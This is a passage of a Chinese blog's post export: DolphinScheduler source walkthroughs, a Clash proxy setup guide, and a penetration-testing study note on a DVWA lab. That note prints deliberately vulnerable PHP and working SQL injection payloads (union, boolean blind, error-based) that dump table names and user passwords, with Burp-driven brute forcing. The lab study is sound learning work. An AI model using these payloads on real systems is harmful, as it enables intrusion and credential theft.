扫描到 commad，进行 dga 构建，初始化，将源头 task 提交到 priority 队列中。 taskConsumer 消费队列数据得到 task，选择一台 worker 分配任务。 worker 接收到分配任务的消息启动任务。 worker 返回结果给 master，master 更新任务信息到 db 。 03 DolphinScheduler源码剖析 3.1 apiserver任务执行入口 当用户在前端点击执行任务，则会向海豚调度的接口发送请求，最终由 ExecutorController 的 startProcessInstance 方法来处理请求。 ExecutorController.startProcessInstance() 方法。 最终会往 mysql 表 t_ds_command 插入一条数据，将要运行的工作流信息写入该表。 1234567891011121314151617181920212223242526272829303132333435363738394041424344@PostMapping(value = &quot;start-process-instance&quot;)@ResponseStatus(HttpStatus.OK)@ApiException(START_PROCESS_INSTANCE_ERROR)@AccessLogAnnotation(ignoreRequestArgs = &quot;loginUser&quot;)public Result startProcessInstance(@ApiIgnore @RequestAttribute(value = Constants.SESSION_USER) User loginUser, @ApiParam(name = &quot;projectCode&quot;, value = &quot;PROJECT_CODE&quot;, required = true) @PathVariable long projectCode, @RequestParam(value = &quot;processDefinitionCode&quot;) long processDefinitionCode, @RequestParam(value = &quot;scheduleTime&quot;) String scheduleTime, @RequestParam(value = &quot;failureStrategy&quot;) FailureStrategy failureStrategy, @RequestParam(value = &quot;startNodeList&quot;, required = false) String startNodeList, @RequestParam(value = &quot;taskDependType&quot;, required = false) TaskDependType taskDependType, @RequestParam(value = &quot;execType&quot;, required = false) CommandType execType, @RequestParam(value = &quot;warningType&quot;) WarningType warningType, @RequestParam(value = &quot;warningGroupId&quot;, required = false, defaultValue = &quot;0&quot;) Integer warningGroupId, @RequestParam(value = &quot;runMode&quot;, required = false) RunMode runMode, @RequestParam(value = &quot;processInstancePriority&quot;, required = false) Priority processInstancePriority, @RequestParam(value = &quot;workerGroup&quot;, required = false, defaultValue = &quot;default&quot;) String workerGroup, @RequestParam(value = &quot;environmentCode&quot;, required = false, defaultValue = &quot;-1&quot;) Long environmentCode, @RequestParam(value = &quot;timeout&quot;, required = false) Integer timeout, @RequestParam(value = &quot;startParams&quot;, required = false) String startParams, @RequestParam(value = &quot;expectedParallelismNumber&quot;, required = false) Integer expectedParallelismNumber, @RequestParam(value = &quot;dryRun&quot;, defaultValue = &quot;0&quot;, required = false) int dryRun, @RequestParam(value = &quot;complementDependentMode&quot;, required = false) ComplementDependentMode complementDependentMode) &#123; if (timeout == null) &#123; timeout = Constants.MAX_TASK_TIMEOUT; &#125; Map&lt;String, String&gt; startParamMap = null; if (startParams != null) &#123; startParamMap = JSONUtils.toMap(startParams); &#125; if (complementDependentMode == null) &#123; complementDependentMode = ComplementDependentMode.OFF_MODE; &#125; //生成commnd信息入库 Map&lt;String, Object&gt; result = execService.execProcessInstance(loginUser, projectCode, processDefinitionCode, scheduleTime, execType, failureStrategy, startNodeList, taskDependType, warningType, warningGroupId, runMode, processInstancePriority, workerGroup, environmentCode, timeout, startParamMap, expectedParallelismNumber, dryRun, complementDependentMode); return returnDataList(result);&#125; 3.2 master 调度任务 3.2.1 master启动 DS MasterServer.run() 方法 启动 master 的工作线程 12345678910111213141516171819202122232425public void run() throws SchedulerException &#123;// init rpc serverthis.masterRPCServer.start();//启动netty rpc服务，与worker通信使用// install task pluginthis.taskPluginManager.loadPlugin();//加载taskplugin// self tolerantthis.masterRegistryClient.init();//加载高可用的一些注册信息this.masterRegistryClient.start();this.masterRegistryClient.setRegistryStoppable(this);//command扫描线程this.masterSchedulerBootstrap.init();this.masterSchedulerBootstrap.start();//事件处理线程this.eventExecuteService.start();this.failoverExecuteThread.start();//定时调度this.schedulerApi.start();Runtime.getRuntime().addShutdownHook(new Thread(() -&gt; &#123; if (Stopper.isRunning()) &#123; close(&quot;MasterServer shutdownHook&quot;); &#125;&#125;));&#125; 3.2.2 command扫描 DS MasterSchedulerBootstrap.run()方法 该线程在3.2.1启动，启动之后，进入循环，一直扫描 command 表，查询出 command，然后封装成 processInstants 入库，创建 WorkflowExecuteRunnable (此对象后续很多地方用到) 写入到 workflowEventQueue 中。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public void run() &#123; while (Stopper.isRunning()) &#123; try &#123; // todo: if the workflow event queue is much, we need to handle the back pressure boolean isOverload = OSUtils.isOverload(masterConfig.getMaxCpuLoadAvg(), masterConfig.getReservedMemory()); if (isOverload) &#123; MasterServerMetrics.incMasterOverload(); Thread.sleep(Constants.SLEEP_TIME_MILLIS); continue; &#125; List&lt;Command&gt; commands = findCommands(); if (CollectionUtils.isEmpty(commands)) &#123; // indicate that no command ,sleep for 1s Thread.sleep(Constants.SLEEP_TIME_MILLIS); continue; &#125; //将command转换成processInstance,并入库 List&lt;ProcessInstance&gt; processInstances = command2ProcessInstance(commands); if (CollectionUtils.isEmpty(processInstances)) &#123; // indicate that the command transform to processInstance error, sleep for 1s Thread.sleep(Constants.SLEEP_TIME_MILLIS); continue; &#125; MasterServerMetrics.incMasterConsumeCommand(commands.size()); processInstances.forEach(processInstance -&gt; &#123; try &#123; LoggerUtils.setWorkflowInstanceIdMDC(processInstance.getId()); if (processInstanceExecCacheManager.contains(processInstance.getId())) &#123; logger.error(&quot;The workflow instance is already been cached, this case shouldn&#x27;t be happened&quot;); &#125; WorkflowExecuteRunnable workflowRunnable = new WorkflowExecuteRunnable(processInstance, processService, nettyExecutorManager, processAlertManager, masterConfig, stateWheelExecuteThread, curingGlobalParamsService); processInstanceExecCacheManager.cache(processInstance.getId(), workflowRunnable);//processInstanceExecCacheManager设置进cache 被 workflowEventLoop获取 workflowEventQueue.addEvent(new WorkflowEvent(WorkflowEventType.START_WORKFLOW, processInstance.getId())); &#125; finally &#123; LoggerUtils.removeWorkflowInstanceIdMDC(); &#125; &#125;); &#125; catch (InterruptedException interruptedException) &#123; logger.warn(&quot;Master schedule bootstrap interrupted, close the loop&quot;, interruptedException); Thread.currentThread().interrupt(); break; &#125; catch (Exception e) &#123; logger.error(&quot;Master schedule workflow error&quot;, e); // sleep for 1s here to avoid the database down cause the exception boom ThreadUtils.sleep(Constants.SLEEP_TIME_MILLIS); &#125; &#125;&#125; }3.2.3 workerFlowEvent消费 DS 在 command 扫描线程中启动了 workflowEventLooper 线程用于消费 workerFlowEvent 。 MasterSchedulerBootstrap.start() 方法 1234567@Overridepublic synchronized void start() &#123; logger.info(&quot;Master schedule bootstrap starting..&quot;); super.start(); workflowEventLooper.start();//工作流调度线程启动 logger.info(&quot;Master schedule bootstrap started...&quot;);&#125; 从workflowEventQueue 拉取 workflowevent 事件，调用 workflowEventHandler 处理该事件。 WorkflowEventLooper.run()方法 12345678910111213141516171819202122232425262728293031323334public void run() &#123; WorkflowEvent workflowEvent = null; while (Stopper.isRunning()) &#123; try &#123; workflowEvent = workflowEventQueue.poolEvent();//拉取workflowevent LoggerUtils.setWorkflowInstanceIdMDC(workflowEvent.getWorkflowInstanceId()); logger.info(&quot;Workflow event looper receive a workflow event: &#123;&#125;, will handle this&quot;, workflowEvent); WorkflowEventHandler workflowEventHandler = workflowEventHandlerMap.get(workflowEvent.getWorkflowEventType());//获取workflowevent，处理workflowevent事件 workflowEventHandler.handleWorkflowEvent(workflowEvent); &#125; catch (InterruptedException e) &#123; logger.warn(&quot;WorkflowEventLooper thread is interrupted, will close this loop&quot;, e); Thread.currentThread().interrupt(); break; &#125; catch (WorkflowEventHandleException workflowEventHandleException) &#123; logger.error(&quot;Handle workflow event failed, will add this event to event queue again, event: &#123;&#125;&quot;, workflowEvent, workflowEventHandleException); workflowEventQueue.addEvent(workflowEvent); ThreadUtils.sleep(Constants.SLEEP_TIME_MILLIS); &#125; catch (WorkflowEventHandleError workflowEventHandleError) &#123; logger.error(&quot;Handle workflow event error, will drop this event, event: &#123;&#125;&quot;, workflowEvent, workflowEventHandleError); &#125; catch (Exception unknownException) &#123; logger.error( &quot;Handle workflow event failed, get a unknown exception, will add this event to event queue again, event: &#123;&#125;&quot;, workflowEvent, unknownException); workflowEventQueue.addEvent(workflowEvent); ThreadUtils.sleep(Constants.SLEEP_TIME_MILLIS); &#125; finally &#123; LoggerUtils.removeWorkflowInstanceIdMDC(); &#125; &#125;&#125; 3.2.4 workerflow事件处理逻辑 DS 因为是START_WORKFLOW类型的所以获取到 WorkflowStartEventHandler.handleWorkflowEvent() 来处理该事件。 该方法中，获取 WorkflowExecuteRunnable ，运行异步任务调用 call 方法。 1234567891011121314151617181920212223242526272829303132@Overridepublic void handleWorkflowEvent(WorkflowEvent workflowEvent) throws WorkflowEventHandleError &#123; logger.info(&quot;Handle workflow start event, begin to start a workflow, event: &#123;&#125;&quot;, workflowEvent);//获取WorkflowExecuteRunnable WorkflowExecuteRunnable workflowExecuteRunnable = processInstanceExecCacheManager.getByProcessInstanceId(workflowEvent.getWorkflowInstanceId()); if (workflowExecuteRunnable == null) &#123; throw new WorkflowEventHandleError( &quot;The workflow start event is invalid, cannot find the workflow instance from cache&quot;); &#125; ProcessInstance processInstance = workflowExecuteRunnable.getProcessInstance(); ProcessInstanceMetrics.incProcessInstanceSubmit(); //异步调用call方法执行workflowExecute运行逻辑。 CompletableFuture&lt;WorkflowSubmitStatue&gt; workflowSubmitFuture = CompletableFuture.supplyAsync(workflowExecuteRunnable::call, workflowExecuteThreadPool); workflowSubmitFuture.thenAccept(workflowSubmitStatue -&gt; &#123; if (WorkflowSubmitStatue.SUCCESS == workflowSubmitStatue) &#123; // submit failed will resend the event to workflow event queue logger.info(&quot;Success submit the workflow instance&quot;);//监听返回状态是否成功 if (processInstance.getTimeout() &gt; 0) &#123;//是否超时 stateWheelExecuteThread.addProcess4TimeoutCheck(processInstance); &#125; &#125; else &#123;//出现异常，重试，重新进入队列，调用call方法 logger.error(&quot;Failed to submit the workflow instance, will resend the workflow start event: &#123;&#125;&quot;, workflowEvent); workflowEventQueue.addEvent(new WorkflowEvent(WorkflowEventType.START_WORKFLOW, processInstance.getId())); &#125; &#125;);&#125; 3.2.5 workerflowRunnable运行逻辑 DS WorkflowExecuteRunnable.call() 初始化workerflow的有向无环图。 初始化任务调度配置 提交源头任务到任务优先级队列中。","categories":[{"name":"技术","slug":"技术","permalink":"http://blog.ioimp.top/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"dolphinscheduler","slug":"dolphinscheduler","permalink":"http://blog.ioimp.top/tags/dolphinscheduler/"},{"name":"大数据分析平台","slug":"大数据分析平台","permalink":"http://blog.ioimp.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/"},{"name":"GitHub","slug":"GitHub","permalink":"http://blog.ioimp.top/tags/GitHub/"}]},{"title":"dolphinscheduler监控功能刨析","slug":"dolphinscheduler监控功能刨析","date":"2023-07-18T01:43:54.000Z","updated":"2023-08-04T01:46:07.073Z","comments":true,"path":"2023/07/18/dolphinscheduler监控功能刨析/","link":"","permalink":"http://blog.ioimp.top/2023/07/18/dolphinscheduler%E7%9B%91%E6%8E%A7%E5%8A%9F%E8%83%BD%E5%88%A8%E6%9E%90/","excerpt":"","text":"dolphinscheduler源码分析记录Dolphinscheduler-api-1MonitorController.java部分 任务一：新增功能获取master&#x2F;work服务器CPU核心数目以及一共磁盘大小， 任务二：分析如何向监控中心API中写入master&#x2F;work服务器CPU核心数目以及一共磁盘大小， 核心代码部分: 123456789101112131415/** * master list * * @param loginUser login user * @return master list */ @ApiOperation(value = &quot;listMaster&quot;, notes = &quot;MASTER_LIST_NOTES&quot;) @GetMapping(value = &quot;/masters&quot;) @ResponseStatus(HttpStatus.OK) @ApiException(LIST_MASTERS_ERROR) @AccessLogAnnotation(ignoreRequestArgs = &quot;loginUser&quot;) public Result listMaster(@ApiIgnore @RequestAttribute(value = Constants.SESSION_USER) User loginUser) &#123; Map&lt;String, Object&gt; result = monitorService.queryMaster(loginUser); return returnDataList(result); &#125; MonitorService.java接口功能核心部分 1Map&lt;String, Object&gt; queryMaster(User loginUser); MonitorServiceImpl.java接口实现类核心部分 123456789101112131415/** * query master list * * @param loginUser login user * @return master information list */ @Override public Map&lt;String, Object&gt; queryMaster(User loginUser) &#123; Map&lt;String, Object&gt; result = new HashMap&lt;&gt;(); List&lt;Server&gt; masterServers = getServerListFromRegistry(true); result.put(Constants.DATA_LIST, masterServers); putMsg(result, Status.SUCCESS); return result; &#125; result.put(Constants.*DATA_LIST*, masterServers); 语句中Constants.*DATA_LIST* 是前端json里的data数组部分，装入masterServers getServerListFromRegistry(true);方法 123456@Override public List&lt;Server&gt; getServerListFromRegistry(boolean isMaster) &#123; return isMaster ? registryClient.getServerList(NodeType.MASTER) : registryClient.getServerList(NodeType.WORKER); &#125; registryClient.getServerList(NodeType.*MASTER*) 获取master节点的服务信息列表 123456789101112131415161718192021222324252627282930313233343536373839404142public List&lt;Server&gt; getServerList(NodeType nodeType) &#123; Map&lt;String, String&gt; serverMaps = getServerMaps(nodeType, false); String parentPath = rootNodePath(nodeType); List&lt;Server&gt; serverList = new ArrayList&lt;&gt;(); for (Map.Entry&lt;String, String&gt; entry : serverMaps.entrySet()) &#123; String serverPath = entry.getKey(); String heartBeatJson = entry.getValue(); if (StringUtils.isEmpty(heartBeatJson)) &#123; logger.error(&quot;The heartBeatJson is empty, serverPath: &#123;&#125;&quot;, serverPath); continue; &#125; Server server = new Server(); switch (nodeType) &#123; case MASTER: MasterHeartBeat masterHeartBeat = JSONUtils.parseObject(heartBeatJson, MasterHeartBeat.class); server.setCreateTime(new Date(masterHeartBeat.getStartupTime())); server.setLastHeartbeatTime(new Date(masterHeartBeat.getReportTime())); server.setId(masterHeartBeat.getProcessId()); server.setCpuCoreCount(masterHeartBeat.getCpuCoreCount());//获取cpu核心数 break; case WORKER: WorkerHeartBeat workerHeartBeat = JSONUtils.parseObject(heartBeatJson, WorkerHeartBeat.class); server.setCreateTime(new Date(workerHeartBeat.getStartupTime())); server.setLastHeartbeatTime(new Date(workerHeartBeat.getReportTime())); server.setId(workerHeartBeat.getProcessId()); break; &#125; server.setResInfo(heartBeatJson); // todo: add host, port in heartBeat Info, so that we don&#x27;t need to parse this again server.setZkDirectory(parentPath + &quot;/&quot; + serverPath); // set host and port String[] hostAndPort = serverPath.split(COLON); String[] hosts = hostAndPort[0].split(DIVISION_STRING); // fetch the last one server.setHost(hosts[hosts.length - 1]); server.setPort(Integer.parseInt(hostAndPort[1])); serverList.add(server); &#125; return serverList; &#125; [MasterHeartBeat.java](http://MasterHeartBeat.java) master心跳 12345678910111213141516171819202122232425262728293031323334353637383940414243/* * Licensed to the Apache Software Foundation (ASF) under one or more * contributor license agreements. See the NOTICE file distributed with * this work for additional information regarding copyright ownership. * The ASF licenses this file to You under the Apache License, Version 2.0 * (the &quot;License&quot;); you may not use this file except in compliance with * the License. You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an &quot;AS IS&quot; BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */package org.apache.dolphinscheduler.common.model;import lombok.AllArgsConstructor;import lombok.Builder;import lombok.Data;import lombok.NoArgsConstructor;@Data@Builder@NoArgsConstructor@AllArgsConstructorpublic class MasterHeartBeat implements HeartBeat &#123; private long startupTime; private long reportTime; private double cpuUsage; private double memoryUsage; private double loadAverage; private double availablePhysicalMemorySize; private double maxCpuloadAvg; private double reservedMemory; private double diskAvailable; private int processId; // 新增核数 private int cpuCoreCount;&#125; 我们进一步深入解析 到这里 getHeartBeat() 方法这里开始调用最关键的一步.cpuCoreCount(OSUtils.getCPUCoreCount()) 真正的获取master节点核心cup数量","categories":[{"name":"技术","slug":"技术","permalink":"http://blog.ioimp.top/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"dolphinscheduler","slug":"dolphinscheduler","permalink":"http://blog.ioimp.top/tags/dolphinscheduler/"},{"name":"大数据分析平台","slug":"大数据分析平台","permalink":"http://blog.ioimp.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/"},{"name":"GitHub","slug":"GitHub","permalink":"http://blog.ioimp.top/tags/GitHub/"}]},{"title":"Clash-for-linux使用教程","slug":"clash-for-linux","date":"2023-05-15T15:57:27.000Z","updated":"2023-08-15T16:06:28.465Z","comments":true,"path":"2023/05/15/clash-for-linux/","link":"","permalink":"http://blog.ioimp.top/2023/05/15/clash-for-linux/","excerpt":"","text":"使用教程下载项目下载项目 1$ git clone https://github.com/wanhebin/clash-for-linux.git 进入到项目目录，编辑.env文件，修改变量CLASH_URL的值。 12$ cd clash-for-linux$ vim .env 注意： .env 文件中的变量 CLASH_SECRET 为自定义 Clash Secret，值为空时，脚本将自动生成随机字符串。 启动程序直接运行脚本文件start.sh 进入项目目录 1$ cd clash-for-linux 运行启动脚本 1234567891011121314151617181920$ sudo bash start.sh正在检测订阅地址...Clash订阅地址可访问！ [ OK ]正在下载Clash配置文件...配置文件config.yaml下载成功！ [ OK ]正在启动Clash服务...服务启动成功！ [ OK ]Clash Dashboard 访问地址：http://&lt;ip&gt;:9090/uiSecret：xxxxxxxxxxxxx请执行以下命令加载环境变量: source /etc/profile.d/clash.sh请执行以下命令开启系统代理: proxy_on若要临时关闭系统代理，请执行: proxy_off 12$ source /etc/profile.d/clash.sh$ proxy_on 检查服务端口 12345$ netstat -tln | grep -E &#x27;9090|789.&#x27;tcp 0 0 127.0.0.1:9090 0.0.0.0:* LISTEN tcp6 0 0 :::7890 :::* LISTEN tcp6 0 0 :::7891 :::* LISTEN tcp6 0 0 :::7892 :::* LISTEN 检查环境变量 123$ env | grep -E &#x27;http_proxy|https_proxy&#x27;http_proxy=http://127.0.0.1:7890https_proxy=http://127.0.0.1:7890 以上步鄹如果正常，说明服务clash程序启动成功，现在就可以体验高速下载github资源了。 重启程序如果需要对Clash配置进行修改，请修改 conf/config.yaml 文件。然后运行 restart.sh 脚本进行重启。 注意：重启脚本 restart.sh 不会更新订阅信息。 停止程序 进入项目目录 1$ cd clash-for-linux 关闭服务 1234$ sudo bash shutdown.sh服务关闭成功，请执行以下命令关闭系统代理：proxy_off 1$ proxy_off 然后检查程序端口、进程以及环境变量http_proxy|https_proxy，若都没则说明服务正常关闭。 Clash Dashboard 访问 Clash Dashboard 通过浏览器访问 start.sh 执行成功后输出的地址，例如：http://192.168.0.1:9090/ui 登录管理界面 在API Base URL一栏中输入：http:&#x2F;&#x2F;&lt;ip&gt;:9090 ，在Secret(optional)一栏中输入启动成功后输出的Secret。 点击Add并选择刚刚输入的管理界面地址，之后便可在浏览器上进行一些配置。 更多教程 此 Clash Dashboard 使用的是yacd项目，详细使用方法请移步到yacd上查询。 常见问题 部分Linux系统默认的 shell /bin/sh 被更改为 dash，运行脚本会出现报错（报错内容一般会有 -en [ OK ]）。建议使用 bash xxx.sh 运行脚本。 部分用户在UI界面找不到代理节点，基本上是因为厂商提供的clash配置文件是经过base64编码的，且配置文件格式不符合clash配置标准。 目前此项目已集成自动识别和转换clash配置文件的功能。如果依然无法使用，则需要通过自建或者第三方平台（不推荐，有泄露风险）对订阅地址转换。 程序日志中出现error: unsupported rule type RULE-SET报错，解决方法查看官方WIKI","categories":[{"name":"proxy","slug":"proxy","permalink":"http://blog.ioimp.top/categories/proxy/"}],"tags":[{"name":"clash","slug":"clash","permalink":"http://blog.ioimp.top/tags/clash/"}]},{"title":"渗透学习记录OS","slug":"渗透学习记录OS","date":"2022-12-25T14:58:29.000Z","updated":"2023-08-04T01:05:35.055Z","comments":true,"path":"2022/12/25/渗透学习记录OS/","link":"","permalink":"http://blog.ioimp.top/2022/12/25/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95OS/","excerpt":"","text":"mysql默认表相关知识在 mysql5 版本以后，mysql 默认在数据库中存放在一个叫 infomation_schema 里面 这个库里面有很多表 重点是这三个表 columns 、tables、SCHEMATA 表字段 CHEMA_NAME 记录着库的信息 columns 存储该用户创建的所有数据库的库名、标名和字段名。 union联合注入攻击原理 步骤一：联合两表 ​ 1.union语句要求字段数一样才可以执行，所以我们要先进行字段判断 常见方法： 1SELECT * FROM `users` WHERE user_id=1 order by 8 判断出字段数为8 然后通过 1SELECT * FROM `users` WHERE user_id=1 union SELECT 1,2,3,4,5,6,7,8 进行联合查询 联合查询后面的语句 1SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT 1,2,user() select后面的数字可以替换成字段的名称或者函数 12-- 替换成mysql内置函数SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user(),md5(&#x27;a&#x27;),version() 123456-- 替换成mysql数据库里的字段SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users-- 也可以在语句后面加上limit限定显示的行数SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users limit 1SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users limit 0,2 12-- 如果不想要第一个表里的数据 可以把1换成-1 因为默认负数就表示不存在的SELECT * FROM guestbook WHERE `comment_id`=-1 union SELECT user_id,user,password from users limit 1 union联合注入攻击分析分析联合注入漏洞代码首先我们先分析构成联合注入攻击的sql注入代码 123456789101112131415161718192021222324252627&lt;?phpif( isset( $_REQUEST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input #这里传入的参数没有进行过滤直接进入sql语句 #从这里可以判断出id是字符串类型 所以在进行sql注入检测的时候要匹配字符 $id = $_REQUEST[ &#x27;id&#x27; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values //显示查询成功后的内容 $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);&#125;?&gt; 判断是否存在联合注入​ 我们先通过靶场查询id 如果在我们没进行源代码分析的基础上 我们首先需要进行数字和字符串判断 1 和1‘ 判断出传入数据是字符串型 即存在注入漏洞 ​ 输入 1’and ‘1’&#x3D;’1 页面返回用户信息 1’and ‘1’&#x3D;’2 页面返回不一样的信息。基本可以确定存在 SQL 注入漏洞. 判断字段数​ 使用语句order by确定当前表的字符数 ​ order by 1 如果页面返回正常 字段数不少于 1,order by 2 不少于 2，一直如此类推直到页面出错。正确的字段数是出错数字减少 1 公式 order by n-1 1’ order by 1–+ 正常 1’ order by 2–+ 正常 1’ order by 3–+ 出错 正常页面 联合查询注入获取敏感信息​ 跟前面咱们分析的一样，这里只是把查询的数据替换成了联合查询的语句 然后进行获取另一个表的字段或者函数 1-1&#x27; union select user,password from users-- 我们也可以使用group_concat（）函数来进行分组打印 1-1&#x27; union select 1,group_concat(user(),0x3A,version())-- 联合查询注入通过information_schema​ 在黑盒情况下我们是不知道当前数据库里都有哪些表的所以我们先从mysql的information_schema入手进行表的查询 第一个表： 这里的database（）函数是来限定查询的表是当前表 1-1&#x27; union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1)-- 第二个表： 1-1&#x27; union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,2)-- 通过两个表的查询我们知道dvwa中含有的表为guestbook 和users 联合查询注入通过information_schema获取字段我们知道数据库的字段都存在mysql默认内置库information_schema的columns里，所以我们想要获取当前数据库的字段名字我们可以通过 获取users表里的第一个字段名字 id 123-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 1)-- -- 注意这里一定要加上限定 因为你每次查询都是一个字段如果不加会报错-- Subquery returns more than 1 row 获取第二个字段名字 password 1-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 2,1)-- 获取第三个字段名字 email 1-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 3,1)-- 获取第四个字段名字 secret 1-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 4,1)-- …………………………. 通过联合查询表里面的内容​ 通过以上操作我们已经获取了当前数据库的库名、表名、字段 那么我们就可以通过下面语句获取表里面的内容了 1-1&#x27; union select 1,(select group_concat(user,0x3a,password) from users limit 1)-- boolean布尔型盲注入代码分析1234567891011121314151617181920212223242526272829&lt;?phpif( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123; // Get input #id为字符串型 get接收id参数 $id = $_GET[ &#x27;id&#x27; ]; // Check database $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &#x27;or die&#x27; to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The &#x27;@&#x27; character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;; &#125; else &#123; // User wasn&#x27;t found, so the page wasn&#x27;t! header( $_SERVER[ &#x27;SERVER_PROTOCOL&#x27; ] . &#x27; 404 Not Found&#x27; ); // Feedback for end user echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 接收 id 的值，直接带入查询，如果存在即返回 users is exists in the database 否则显示 users id is missing 像这种只有正确与错误页面。页面不会显示数据库 里任何内容，如果存在注入，成为盲注入。 ​ 盲注入的方法有两种：一是布尔型盲注入，二是延时注入 判断盲注入​ 我们可以通过1&#39; and &#39;1&#39;=&#39;1 和 1&#39; and &#39;1&#39;=&#39;2 是否一样 ​ 以及 1&#39; and sleep(10)--让他睡10s判断是否一样 Boolean布尔型注入攻击​ 因为页面不会返回查询的内容所以我们不能使用联合查询注入攻击，但是我们可以通过构造sql来获取数据。 ​ 11&#x27; and if(1=1,1,0)-- -- 三目运算 布尔型盲注入获取数据库敏感信息​ 在黑盒测试环境下，通过构造sql语句来进行获取敏感信息。 构造sql语句常用的函数： 1.SUBSTRING()字符串截取函数，第一个参数是字符串，第二个参数开始截取，第三个参数是截取的长度 我们可以构造这样的sql语句 1SELECT if(SUBSTRING(database(),1,1)=&#x27;d&#x27;,1,0) 如果截取的第一个字符是‘d’我们返回1 否则返回0 此类推。再后拼接字符就是完整的库名。 黑盒情况下进行布尔盲注入步骤： ​ 我们首先需要判断注入是否为布尔注入，判断完后就可以获取数据库的长度，得到长度再查询库名，然后查询表名，字段，字段内容。。。 布尔盲注入查询长度​ 通过构造如下sql语句进行数据库长度的查询 11&#x27; and if(length(database())=4,1,0)-- 判断出长度为4 布尔盲注入判断库名这一步操作其实就是通过遍历 10123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_ 与语句进行整合判断出是否返回1 11&#x27; and if(SUBSTRING(database(),1,1)=&#x27;$d&#x27;,1,0)-- 当然了，我们手动进行一个一个测试肯定很慢，那么我们可以借助burp来进行如此操作 带有构造sql语句的url 1http://192.168.18.137/01/vulnerabilities/sqli_blind/?id=1%27%20and%20if(SUBSTRING(database(),1,1)=%27d%27,1,0)--%20&amp;Submit=Submit# 再burp里面抓包然后送入intruder 先清除变量 然后再将数字和字母设为变量 攻击类型选择 cluster bomb 然后就是payloads里面两个变量的设置 然后开始攻击就行 跑出来的状态码为200即为成功！ 获得的数据库名为 dvwa 接着我们通过库名来获取表名 11&#x27; and if(SUBSTRING((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1),1,1)=&#x27;g&#x27;,1,0)-- 同样通过burp进行抓包 获取到表名guestbook 然后获取字段名 11&#x27; and if(SUBSTRING((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 1,1),1,1)=&#x27;l&#x27;,1,0)-- 同样我们用burp进行爆破 得到字段名为login password等 获得完 字段后 我们可以进一步获取字段内容【账号+密码】 11&#x27; and if(SUBSTRING((select CONCAT(user,0x3a,PASSWORD) from users limit 1),1,1)=&#x27;a&#x27;,1,0)-- 报错注入​ 顾名思义报错注入就是指数据库显示错误，比如sql语法错误 一般对于php。特别php 在执行 SQL 语句时一般都会采用异常处理函数，捕获错误信息。在 php 中 使用 mysql_error()函数 ​ 如果在查询注入时候会有报错信息返回，可以采用报错注入 报错注入分析1234567891011121314151617181920212223242526&lt;?phpif( isset( $_REQUEST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input # get传入id 字符串型 $id = $_REQUEST[ &#x27;id&#x27; ]; // Check database # mysqli_error 函数返回错误信息 $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . 